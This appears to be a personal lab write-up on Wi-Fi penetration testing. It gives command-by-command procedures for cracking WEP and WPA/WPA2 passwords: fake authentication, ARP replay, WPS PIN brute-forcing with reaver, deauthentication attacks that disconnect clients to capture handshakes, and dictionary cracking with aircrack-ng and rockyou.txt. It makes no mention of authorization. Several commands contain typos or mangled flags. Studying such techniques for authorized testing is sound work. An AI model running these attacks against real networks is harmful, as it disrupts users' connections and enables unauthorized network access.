# Wireless Network Penetration Testing

## Objective

Finding weaknesses in Wifi networks and exploiting vulnerabilities in their encryption protocols (e.g., WEP, WPA, WPA2).


### Skills Learned

- Finding 5Gz and 2.5Gz wireless networks around me
- aircrack-ng
  

### Tools Used

- Kali Linux.
- VMware Fusion.
- airodump-ng
- aircrack-ng
- WASH
- aireplay-ng
- Crunch
- bettercap

### Steps for WAP

- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

>The mode will be Monitor now

1. Finding the 5G and 2.4G networks and find the network with the cipher WEP
```bash
airdump-ng --band abg wlan0
```

2. Find packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
```bash
airodump-ng --bssid 03:DE:4B:AD:CC:8B --channel 9 --write test mon0
```

3. Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
4. Use aircrack-ng to find the Key from the file we created ending with .cap
```bash
aircrack-ng test.cap
```
5. Copy the key and remove the : and that would be the wifi password.

**If the network is not busy we need to follow the steps below: -**

1. We need to capture data from the WEP network and write it in a file.
```bash
 airodump-ng --bssid B4:75:0E:36:6A:9E --channel 11 --write basic_wep wlan0
```
2. We will need to commmunicate with the WEP network by creating a Fake Authentication attack using aireplay-ng
```bash
aireplay-ng --fakeauth 0 -a B4:75:0E:36:6A:9E -h 6E:3D:AC:84:DB:A0 wlan0
```
>the first MAC is the target and the second MAC is the USB adapter.
>If you want to know the permanent MAC address of the USB adapter
```bash
macchanger -s wlan0
Current MAC:   ba:1f:40:bc:19:d4 (unknown)
Permanent MAC: 34:7d:e4:40:83:86 (unknown)
```
3. We need to create an ARP Request preplay attack to generate new packets
```bash
aireplay-ng --arpreplay -b B4:75:0E:36:6A:9E -h ba:1f:40:bc:19:d4 wlan0
```
4. We will then crack the file we created to find the password.
```bash
aircrack-ng arpreplay-01.cap
```

### Steps for WPA/WPA2

**Works for some routers with WPS**
- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
- Find wifi networks with WPS enebled using the tool WASH
```bash
wash --interface wlan0
```
- Use aireplay-ng to create a fake authentication with te first MAC address is the target and the second is the USB wireless adapter MAC address, which is the first 12 characters from the ifconfig, make sure to replace the "-" with the ":".
```bash
aireplay-ng --fakeauth 30 -a 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
```
- Don't execute the code above yet. We go to the second terminal and use reaver tool to bruteforce and get the pin.
```bash
reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associate
```

- If Reaver finds the pin then the password will be available for the Wifi network. 
>Not all routers will be cracked with these steps.

**Method for capturing handshake**

1. Find on 5G and 2.4G networks and find the network with WPA/WPA2 and get the BSSID
```bash
airdump-ng --band abg wlan0
```
2. Write a file via **airodump-ng**.
```bash
airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
```
3. Disconnect the client from the target network to capture the handshake.
```bash
aireplay-ng --deauth 4 -a 30:DE:4B:AD:CC:8A -c EE:7B:BE:70:D6:1F wlan0
```
> The number after the --deauth is the number of packets you want to send to the target.
> The first MAC is the target and the second MAC of the client you want to disconnect (will be under station).

4. The handshake WPA will be saved in the file we created wpa_handshake.cap
5. We will create a wordlist of passwords possibilities using the tool **Crunch**. Then read the file
```bash
crunch 1 3 abc123 -o test_wordlist.txt
cat test_worklist.txt
```

### Another way to get WPA passcodes (Wireless Access with Bettercap on Kali Linux) - four way handshake

- Change the wireless adapter to monitor mode
- activate bettercap -iface and activate net.recon
- activate wifi.recon and can see the access points of the environment we are sniffing by using **wifi.show**
- then we activate some other modules
```bash
set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap
```
- We the deauth the SSID we want
``` bash
wifi.deauth <SSID of the wifi network>
```

- We wait until we see hanshakes are captured by bettercap

### Another way to find weaknesses  WPA2 /WPA3 (Handshakes)

- **ip addr** to show the IP address of the Wlan0 network for the wifi adapter.
- **iw dev** to show the wifi adapter and the mode its in.
- We will kill all processes
```bash
sudo airmon-ng check kill
```

- We then start the wifi adapter to change it to monitor mode.
```bash
sudo airmon-ng start wlan0
```

- We scan for the wifi networks.
```bash
sudo airodump-ng wlan0mon
```

- Save the BSSID and Channel and ESSID
- Now we can create a file and capture 802.11 frames that were captured to a file.
```bash
sudo  airodump-ng –w captures – bssid <MAC Address> wlan0
```
- Now we will create a deauth attack to the wifi network and then we will try to connect to the network with another device to capture the handshake

```bash
sudo aireplay-ng –deauth 0 – a <MAC Address of AP> wlan0
```

- We open the capture file with wireshark. **wireshark captureFile-01.cap**
- We need to filter the data by typing eapol and look for a reply and then a WPA Key Data

![image](https://github.com/user-attachments/assets/0b96849d-c7eb-4d7d-b3cc-d6b1e41e8526)

- We the stop monitor mode for the wifi adapter

```bash
sude airmon-ng stop wlan0
```

- We got to wordlists and download rockup.txt file
- We then use the rockyou file to crack the password
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt
```

- You can also use the program **wifite** to do all of this in one command.




 
￼
